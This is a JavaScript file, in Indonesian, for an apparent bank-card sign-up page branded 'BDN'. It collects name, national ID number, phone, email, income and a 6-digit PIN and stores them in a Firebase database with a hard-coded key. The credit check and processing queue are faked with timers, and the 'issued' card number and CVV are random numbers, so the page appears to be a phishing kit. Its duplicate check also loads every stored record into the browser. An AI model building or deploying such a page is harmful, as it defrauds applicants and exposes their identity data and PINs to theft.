import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyDXYDqFmhO8nacuX-hVnNsXMmpeqwYlW7U",
    authDomain: "wifist-d3588.firebaseapp.com",
    databaseURL: "https://wifist-d3588-default-rtdb.asia-southeast1.firebasedatabase.app/", 
    projectId: "wifist-d3588"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentStep = 1;

// --- VALIDASI INPUT REALTIME ---
const inputNama = document.getElementById('inputNama');
const inputNIK = document.getElementById('inputNIK');
const inputWA = document.getElementById('inputWA');
const inputPW = document.getElementById('inputPW');

// 1. Nama: Kapital Otomatis & No Simbol/Nomor
inputNama.addEventListener('input', (e) => {
    e.target.value = e.target.value.toUpperCase().replace(/[^A-Z\s]/g, "");
});

// 2. NIK & WA & PIN: Hanya Angka (Mencegah Huruf)
[inputNIK, inputWA, inputPW].forEach(el => {
    el.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, "");
    });
});

// --- NAVIGATION ---
window.nextStep = (s) => {
    if (s > currentStep && !validateFields(currentStep)) return;
    currentStep = s;
    updateUI(s);
    if (s === 6) prosesAnalisisSistem();
};

window.prevStep = () => {
    if (currentStep > 1) {
        currentStep--;
        updateUI(currentStep);
        // Reset tombol jika kembali dari step 6
        document.getElementById('btnSlik').style.display = "none";
        document.getElementById('errorActions').style.display = "none";
    }
};

function validateFields(step) {
    if (step === 1) {
        if (inputNama.value.length < 3) { alert("Nama lengkap minimal 3 huruf!"); return false; }
        if (inputNIK.value.length !== 16) { alert("NIK harus 16 digit angka!"); return false; }
    }
    if (step === 2) {
        if (inputWA.value.length < 11 || inputWA.value.length > 13) { alert("WhatsApp harus 11-13 digit!"); return false; }
        if (!document.getElementById('inputEmail').value.includes('@')) { alert("Email tidak valid!"); return false; }
    }
    if (step === 5 && inputPW.value.length !== 6) {
        alert("PIN harus 6 digit!"); return false;
    }
    return true;
}

function updateUI(s) {
    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
    document.getElementById(`step${s}`).classList.add('active');
    const percent = ((s - 1) / 7) * 100;
    document.getElementById('progressLine').style.width = percent + "%";
    document.querySelectorAll('.circle').forEach((c, i) => {
        c.classList.remove('active', 'completed');
        if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
        else if (i === s - 1) { c.classList.add('active'); c.innerHTML = i + 1; }
        else { c.innerHTML = i + 1; }
    });
}

// --- STEP 6: SISTEM SKORING & DATABASE CHECK ---
async function prosesAnalisisSistem() {
    const status = document.getElementById('slikStatus');
    const btnNext = document.getElementById('btnSlik');
    const errAct = document.getElementById('errorActions');
    
    status.innerHTML = "Mengecek integritas data...";
    
    // Logic Skor
    const namaValue = inputNama.value;
    const nikValue = inputNIK.value;
    const waValue = inputWA.value;

    // Cek Angka Beruntun Berlebihan (Contoh: 111111)
    const isSequential = (str) => /(.)\1{5,}/.test(str);
    // Cek Nama Kasar
    const kasar = ["ANJING", "KONTOL", "MEMEK", "GOBLOK", "ASU", "ADMIN", "TEST", "CASH"];
    const isKasar = kasar.some(k => namaValue.includes(k));

    let skor = "A+";
    let pesan = "";

    if (isSequential(nikValue) || isSequential(waValue)) { skor = "E"; pesan = "Data terdeteksi SPAM/Beruntun."; }
    else if (isKasar) { skor = "D"; pesan = "Nama mengandung kata tidak pantas."; }
    else if (/(0123|1234|2345)/.test(nikValue)) { skor = "C"; pesan = "Pola NIK tidak logis."; }

    // Cek Firebase Duplikat
    try {
        const snapshot = await get(child(ref(db), 'nasabah'));
        if (snapshot.exists()) {
            const data = snapshot.val();
            for (let id in data) {
                if (data[id].nik === nikValue) {
                    skor = "E"; pesan = "NIK sudah terdaftar di sistem kami.";
                }
            }
        }
    } catch (e) { console.error("DB Check Error"); }

    setTimeout(() => {
        if (skor === "E") {
            status.innerHTML = `<b style="color:red">SKOR E: DITOLAK</b><br>${pesan}`;
            errAct.style.display = "block";
        } else if (skor === "D") {
            status.innerHTML = `<b style="color:red">SKOR D: TANGGUHKAN</b><br>${pesan}`;
            errAct.style.display = "block";
        } else if (skor === "C") {
            status.innerHTML = `<b style="color:orange">SKOR C: EVALUASI</b><br>${pesan}`;
            btnNext.style.display = "flex";
        } else {
            status.innerHTML = `<b style="color:#22c55e">SKOR ${skor}: TERVERIFIKASI</b>`;
            btnNext.style.display = "flex";
        }
    }, 2500);
}

// --- SIMPAN KE FIREBASE & TERBITKAN ---
window.generateFinal = async () => {
    if (!document.getElementById('checkAgree').checked) return alert("Harap centang persetujuan!");
    
    const nasabahData = {
        nama: inputNama.value,
        nik: inputNIK.value,
        wa: inputWA.value,
        email: document.getElementById('inputEmail').value,
        pekerjaan: document.getElementById('jobType').value,
        pendapatan: document.getElementById('income').value,
        pin: inputPW.value,
        tgl_daftar: new Date().toLocaleString()
    };

    try {
        await set(ref(db, 'nasabah/' + inputNIK.value), nasabahData);
        updateUI(8);
        initQueue();
    } catch (e) {
        alert("Gagal menyimpan data!");
    }
};

function initQueue() {
    let timeLeft = 120;
    const interval = setInterval(() => {
        timeLeft--;
        document.getElementById('fillBar').style.width = ((120 - timeLeft) / 120 * 100) + "%";
        document.getElementById('timerDisplay').innerText = `Estimasi: ${timeLeft} Detik`;
        if (timeLeft <= 0) {
            clearInterval(interval);
            finalRevealProcess();
        }
    }, 1000);
}

async function finalRevealProcess() {
    document.getElementById('processingArea').style.display = 'none';
    document.getElementById('finalReveal').style.display = 'block';
    document.querySelector('.card-scene').classList.add('final-glow');

    const cardNo = "0810" + Math.floor(Math.random() * 899999999999 + 100000000000);
    const cvvRandom = Math.floor(Math.random() * 899 + 100);
    
    document.getElementById('displayNo').innerText = cardNo.match(/.{1,4}/g).join(" ");
    document.getElementById('displayName').innerText = inputNama.value;
    document.querySelector('.cvv-code').innerText = cvvRandom;

    for(let i=1; i<=3; i++) {
        await new Promise(r => setTimeout(r, 600));
        document.getElementById(`rev${i}`).classList.add('show');
    }
}

window.toggleFlip = () => {
    document.getElementById('cardInner').classList.toggle('is-flipped');
    if (navigator.vibrate) navigator.vibrate(25);
};

window.takeScreenshot = () => {
    const area = document.getElementById('captureArea');
    const btn = document.getElementById('btnDownload');
    btn.innerText = "MENGUNDUH...";
    html2canvas(area, { scale: 3, useCORS: true }).then(canvas => {
        const link = document.createElement('a');
        link.download = `BDN-CARD-${inputNama.value}.png`;
        link.href = canvas.toDataURL();
        link.click();
        btn.innerText = "📸 SIMPAN GAMBAR KARTU";
    });
};

window.addEmergencyField = () => {
    const container = document.getElementById('emergencyContainer');
    const div = document.createElement('div');
    div.className = 'emergency-item';
    div.innerHTML = `
        <div class="input-group"><label>Nama Keluarga</label><input type="text" class="em-name"></div>
        <div class="input-group"><label>Nomor HP</label><input type="tel" class="em-phone"></div>
        <button type="button" onclick="this.parentElement.remove()" style="color:red; font-size:10px; border:none; background:none; cursor:pointer;">Hapus</button>
    `;
    container.appendChild(div);
};
